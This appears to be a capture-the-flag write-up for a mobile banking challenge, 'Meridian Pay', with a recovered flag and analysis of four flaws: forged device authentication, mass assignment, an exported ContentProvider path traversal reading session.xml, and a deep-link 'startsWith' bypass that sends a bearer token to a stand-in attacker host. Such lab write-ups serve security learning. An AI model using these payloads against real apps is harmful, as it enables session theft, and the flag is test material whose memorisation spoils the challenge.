---
challenge: meridian_pay
category: mobile
techniques: [apk_decompilation, device_auth_bypass, jwt_session_analysis, content_provider_traversal, deep_link_prefix_leak]
time_to_flag: 60
status: in_progress
flags_recovered: 1
total_flags: 4
---

# Meridian Pay - Investigation & Solution Notes

## Challenge Overview
- **Category:** Mobile / Web API (Hard)
- **Target Instance:** `https://web-f747413d78eddd9f.web.h7tex.com`
- **Application Package:** `com.meridian.pay` (`meridian-pay-3.2.1.apk`)
- **Challenge Summary:**
  > "Meridian Pay is a neobank that shipped in a hurry and trusts everyone: the client trusts the server, the server trusts the client, and both trust the phone underneath. Four separate cracks are hiding in that arrangement, some in the app and some in the API behind it, one flag each."
- **Total Flags:** 4 flags apiece.

---

## Recovered Flag
- **Flag 1:**
  ```
  H7CTF{138d04db-d152-45e8-b1f0-a3a7166bc980}
  ```
  *(Dynamic UUID flag verified on current instance via `/api/v1/internal/promo`).*

---

## Detailed Vulnerability Analysis Across the Four Vectors

### 1. Vector 1: Client-Controlled Device Authentication (API Level)
- **Endpoint:** `POST /api/v1/auth/device`
- **Required Header:** `X-Meridian-Client: MeridianPay-Android/3.2.1 (attested)`
- **Behavior:**
  The server expects client identity from a user-supplied JSON object `{"device_id": "<id>"}`. No cryptographic attestation (SafetyNet, Play Integrity, or keypair signing) is validated. Any truthy string issues a valid JWT for user `1001` (`Alicia Reyes`).
- **Payoff:**
  Providing the issued Bearer JWT along with the exact attested client header to `GET /api/v1/internal/promo` returns an HTML page containing Flag 1 inside a `<pre>` element.

### 2. Vector 2: Profile Parameter Mass Assignment (API Level)
- **Endpoint:** `PATCH /api/v1/profile`
- **Allowed Methods:** `OPTIONS`, `PATCH`
- **Behavior:**
  Arbitrary JSON keys passed to `PATCH` are accepted into the user profile dictionary and echoed in the `updated` response array.
- **Findings:**
  While arbitrary fields are stored, the server's session identity remains bound to `sub: "1001"`, and the profile view only surfaces `email`, `name`, `role`, and `tier`.

### 3. Vector 3: Exported ContentProvider Path Traversal (App / Local OS Level)
- **Component:** `com.meridian.pay.ExportProvider` (`content://com.meridian.pay.export`)
- **Manifest:** `android:exported="true"`, `android:grantUriPermissions="true"`
- **Decompiled Implementation (`ExportProvider.openFile`):**
  ```java
  File receiptsDir = new File(getContext().getFilesDir(), "receipts");
  String path = uri.getPath();
  if (path.startsWith("/files/")) {
      path = path.substring("/files/".length());
  }
  return ParcelFileDescriptor.open(new File(receiptsDir, path), MODE_READ_ONLY);
  ```
- **Vulnerability:**
  The URI path is directly stripped of `/files/` and joined with `receiptsDir` without canonicalization or directory boundary validation (`getCanonicalPath().startsWith(...)`).
- **Verified Exploitation on Emulator:**
  Reading `content://com.meridian.pay.export/files/../../shared_prefs/session.xml` successfully escapes the `receipts` directory and reads internal application preferences, disclosing the stored session token, device ID, and account name.

### 4. Vector 4: Deep Link Prefix Validation & Credential Transmission (App Level)
- **Components:** `com.meridian.pay.RouterActivity` & `com.meridian.pay.WebViewActivity`
- **Manifest:** `RouterActivity` is exported with intent filter `meridianpay://open?url=...`.
- **Decompiled Implementation:**
  ```java
  if (url.startsWith(session.baseUrl())) {
      headers.put("Authorization", "Bearer " + session.token());
      headers.put("X-Meridian-Client", "MeridianPay-Android/3.2.1 (attested)");
      webView.loadUrl(url, headers);
  }
  ```
- **Vulnerability:**
  `String.startsWith()` fails to enforce origin boundaries. A URL of the format `http://10.0.2.2:8080@attacker-host/` satisfies `startsWith("http://10.0.2.2:8080")` while routing to `attacker-host`, transmitting the Bearer token and attested client header.

---

## Verification Artifacts
- **Solver Script:** [`solutions/meridian_pay/solve.py`](file:///c:/Users/USER/OneDrive/Desktop/ctf/solutions/meridian_pay/solve.py)
- **Local Emulator Environment:**
  - AVD: `Medium_Phone_API_36.1`
  - ADB: `C:\Users\USER\AppData\Local\Android\Sdk\platform-tools\adb.exe`
